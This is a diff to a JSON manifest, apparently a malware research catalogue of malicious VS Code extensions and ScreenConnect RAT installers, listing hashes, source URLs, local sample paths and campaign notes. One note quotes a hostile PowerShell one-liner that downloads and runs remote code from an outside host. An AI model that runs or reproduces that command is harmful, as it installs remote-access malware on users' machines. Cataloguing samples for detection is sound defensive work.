@@ -1,7 +1,7 @@
 {
   "$schema": "./manifest.schema.json",
   "version": "1.1.0",
-  "lastUpdated": "2026-01-27",
+  "lastUpdated": "2026-02-07",
   "samples": [
     {
       "id": "snowshono-powershell-downloader",
@@ -17,7 +17,10 @@
       "discoveryDate": "2024-01-01",
       "capabilities": ["obfuscation", "powershell-execution", "downloader"],
       "localPath": "kagema/ShowSnowcrypto.SnowShoNo/showsnowcrypto.snowshono-0.6.0.zip",
-      "notes": "Obfuscated JS. Runs hidden PowerShell: irm https://niggboo.com/aaa | iex. Windows-only check."
+      "notes": "Obfuscated JS. Runs hidden PowerShell: irm https://niggboo.com/aaa | iex. Windows-only check.",
+      "relatedHashes": {
+        "ScreenConnect.ClientSetup.msi": "290027e4e32cf4983ccaa9811b3090c7397a3711d23e426ab144bec1167c456b"
+      }
     },
     {
       "id": "ecm3401-attack-suite",
@@ -359,6 +362,38 @@
       "capabilities": ["rat", "remote-access"],
       "localPath": null,
       "notes": "Fake Ethereum publisher. 380K fake installs. Silently installs ScreenConnect client."
+    },
+    {
+      "id": "solidityai-screenconnect",
+      "name": "Solidity",
+      "publisher": "SolidityAI",
+      "version": "1.0.9",
+      "platform": "vscode",
+      "campaign": "TheseVibesAreOff",
+      "malwareFamily": "ScreenConnect",
+      "sha256": "eade98db399cae0e6bdb2a4eb0de912d0d9c649f53b2e150522301e87b2c8a46",
+      "source": "research",
+      "sourceUrl": "https://secureannex.com/blog/these-vibes-are-off/",
+      "discoveryDate": "2025-11-01",
+      "capabilities": ["rat", "remote-access"],
+      "localPath": "thesevibesareoff/solidityai.solidity-1.0.9.vsix",
+      "notes": "ScreenConnect RAT delivery via fake Solidity extension. Part of SecureAnnex 'These Vibes Are Off' report."
+    },
+    {
+      "id": "snowshono-screenconnect-msi",
+      "name": "ScreenConnect MSI Installer",
+      "publisher": "ShowSnowcrypto",
+      "version": null,
+      "platform": "windows",
+      "campaign": "SnowShoNo",
+      "malwareFamily": "ScreenConnect",
+      "sha256": "290027e4e32cf4983ccaa9811b3090c7397a3711d23e426ab144bec1167c456b",
+      "source": "malwarebazaar",
+      "sourceUrl": "https://bazaar.abuse.ch/sample/290027e4e32cf4983ccaa9811b3090c7397a3711d23e426ab144bec1167c456b/",
+      "discoveryDate": "2025-10-01",
+      "capabilities": ["rat", "remote-access", "persistence"],
+      "localPath": "snowshono/snowshono-msi/290027e4e32cf4983ccaa9811b3090c7397a3711d23e426ab144bec1167c456b.msi",
+      "notes": "ScreenConnect MSI installer payload delivered by SnowShoNo PowerShell downloader. 13MB MSI."
     }
   ],
   "githubSources": [
@@ -465,6 +500,12 @@
       "filename": "priskinski.theme-allhallowseve-remake.vsix",
       "campaign": "ReversingLabs-Dec2025",
       "localPath": "malwarebazaar/priskinski.theme-allhallowseve-remake-1.0.0.vsix"
+    },
+    {
+      "sha256": "290027e4e32cf4983ccaa9811b3090c7397a3711d23e426ab144bec1167c456b",
+      "filename": "ScreenConnect.ClientSetup.msi",
+      "campaign": "SnowShoNo",
+      "localPath": "snowshono/snowshono-msi/290027e4e32cf4983ccaa9811b3090c7397a3711d23e426ab144bec1167c456b.msi"
     }
   ]
 }
